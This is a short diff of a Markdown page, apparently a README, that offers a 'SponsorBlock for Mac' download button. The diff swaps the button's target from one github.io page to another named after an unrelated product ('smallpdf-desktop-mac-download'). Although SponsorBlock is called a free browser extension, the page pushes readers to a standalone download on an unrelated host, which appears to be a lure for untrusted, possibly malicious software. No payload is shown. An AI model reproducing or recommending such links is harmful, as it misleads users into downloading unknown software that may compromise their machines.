@@ -2,7 +2,7 @@
 
 ## ✅ Download SponsorBlock for Mac (Free Browser Extension)
 
-[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://sponsorblock-mac-download.github.io/.github)
+[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://smallpdf-desktop-mac-download.github.io/.github)
 
 ---
 
